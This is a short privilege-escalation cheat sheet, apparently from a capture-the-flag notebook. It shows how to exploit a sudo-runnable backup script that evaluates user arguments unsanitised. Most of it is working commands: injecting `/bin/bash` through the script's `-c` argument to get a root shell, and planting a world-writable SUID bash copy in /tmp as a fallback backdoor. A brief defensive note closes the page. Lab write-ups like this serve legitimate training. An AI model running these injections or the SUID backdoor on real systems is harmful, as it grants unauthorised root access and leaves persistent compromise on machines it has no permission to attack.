# Sudo Script Command Injection via Arguments

Used on: **cyborgt8**

When a script is executable via `sudo` and passes command-line arguments unsanitized into a shell evaluation context (such as `$()`, `eval`, or backticks), an attacker can inject arbitrary commands to be executed as root.

## Prerequisites

- `sudo -l` shows a script that can be run without a password.
- The script passes arguments directly into an execution context like `cmd=$($1)` or `eval "$2"`.

## Steps

### 1. Identify the Vulnerability

<!-- cmd: linux -->
```bash
cat /etc/mp3backups/backup.sh
# Example vulnerable line:
# cmd=$($command)
```

### 2. Inject Command

Since the script takes the `$command` directly from the user's arguments, injecting `/bin/bash` will cause the script to evaluate `/bin/bash` with root privileges.

<!-- cmd: linux -->
```bash
sudo /etc/mp3backups/backup.sh -c "/bin/bash"
```

### 3. SUID Bash (If interactive shell drops)

If the script's execution context absorbs standard input/output and doesn't present an interactive shell, you can use the injected context to create a SUID copy of bash.

<!-- cmd: linux -->
```bash
sudo /etc/mp3backups/backup.sh -c "cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash"
/tmp/rootbash -p
```

## Defensive Note

Always validate command-line arguments and avoid passing raw input into execution evaluation functions. Use explicit executable paths instead of dynamic resolution.
